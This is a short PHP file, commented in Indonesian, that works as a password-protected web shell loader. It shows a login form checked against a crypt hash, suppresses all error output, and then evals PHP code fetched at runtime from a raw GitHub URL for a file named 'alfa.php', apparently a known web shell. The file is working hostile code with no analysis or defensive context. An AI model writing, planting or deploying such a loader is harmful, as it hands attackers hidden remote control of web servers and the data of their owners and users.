<?php
session_start();

// Hash password (bisa dihasilkan dengan crypt() sebelumnya)
$hashed_password = '$6$1a2b3c4d5e6f$1YoO4yaeO2iKHn7aHbYx7uYAzE6gPY.RrT5ClEUGmZAvGSZJymz4AW2H/Rw/v1v2JtPhm7ROCB8UI3M8sLjo5/';

if (!isset($_SESSION['authenticated'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (crypt($_POST['password'], $hashed_password) === $hashed_password) {
            $_SESSION['authenticated'] = true;
        } else {
            die("Password salah!");
        }
    } else {
        echo '<form method="POST">
                <input type="password" name="password" placeholder="Masukkan password">
                <input type="submit" value="Login">
              </form>';
        exit;
    }
}

error_reporting(0);
ini_set('display_errors', 0);
?>
<?php eval(
    urldecode("%3f%3e") .
    file_get_contents(
        urldecode("https://raw.githubusercontent.com/erosjoko5/solo/refs/heads/main/alfa.php")
    )
); ?>
